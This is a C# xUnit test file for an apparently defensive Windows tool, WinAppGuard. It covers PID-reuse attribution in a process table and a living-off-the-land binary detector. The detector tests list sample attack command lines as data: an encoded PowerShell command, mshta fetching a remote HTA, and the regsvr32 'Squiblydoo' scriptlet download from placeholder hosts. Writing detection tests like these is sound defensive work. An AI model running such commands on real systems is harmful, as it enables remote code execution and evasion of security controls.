using WinAppGuard.Core.Diagnostics.Processes;

namespace WinAppGuard.Architecture.Tests;

/// <summary>
/// 6.0：PID 复用与进程生命周期归因。
/// </summary>
public sealed class ProcessTableTests
{
    [Fact]
    public void ResolvesByTimeWindowWhenPidIsReused()
    {
        var table = new ProcessTable();
        var firstStart = new DateTime(2026, 1, 1, 10, 0, 0, DateTimeKind.Utc);
        var firstStop = firstStart.AddMinutes(1);
        var secondStart = firstStart.AddMinutes(2);

        table.AddStart(Entry(4242, @"C:\A\first.exe", firstStart));
        table.AddStop(4242, firstStop);
        table.AddStart(Entry(4242, @"C:\B\second.exe", secondStart));

        var first = table.Resolve(4242, firstStart.AddSeconds(10));
        var second = table.Resolve(4242, secondStart.AddSeconds(10));

        Assert.True(first.Exact);
        Assert.EndsWith("first.exe", first.Entry!.ImagePath, StringComparison.OrdinalIgnoreCase);

        Assert.True(second.Exact);
        Assert.EndsWith("second.exe", second.Entry!.ImagePath, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void GapBetweenProcessesIsNotGuessed()
    {
        var table = new ProcessTable();
        var start = new DateTime(2026, 1, 1, 10, 0, 0, DateTimeKind.Utc);
        var stop = start.AddMinutes(1);

        table.AddStart(Entry(100, @"C:\A\a.exe", start));
        table.AddStop(100, stop);

        // 10 分钟窗口会保留“最近结束”的记录，但必须标记为不确定。
        var result = table.Resolve(100, stop.AddMinutes(2));

        Assert.False(result.Exact);
        Assert.NotNull(result.Entry);
    }

    [Theory]
    [InlineData("powershell.exe", "powershell -enc AAAA", "LOLBIN-POWERSHELL-ENCODED")]
    [InlineData("mshta.exe", "mshta https://example.test/a.hta", "LOLBIN-MSHTA-REMOTE")]
    [InlineData("regsvr32.exe", "regsvr32 /s /u /i:http://x scrobj.dll", "LOLBIN-REGSVR32-SQUIBLYDOO")]
    public void LolbinMatcherReturnsRuleId(string name, string command, string expected)
    {
        var path = Path.Combine(Path.GetTempPath(), name);

        Assert.Equal(expected, LolbinMatcher.Match(path, command));
    }

    private static ProcessTraceEntry Entry(int pid, string path, DateTime start) => new()
    {
        Pid = pid,
        ParentPid = 0,
        ImagePath = path,
        StartUtc = start,
    };
}
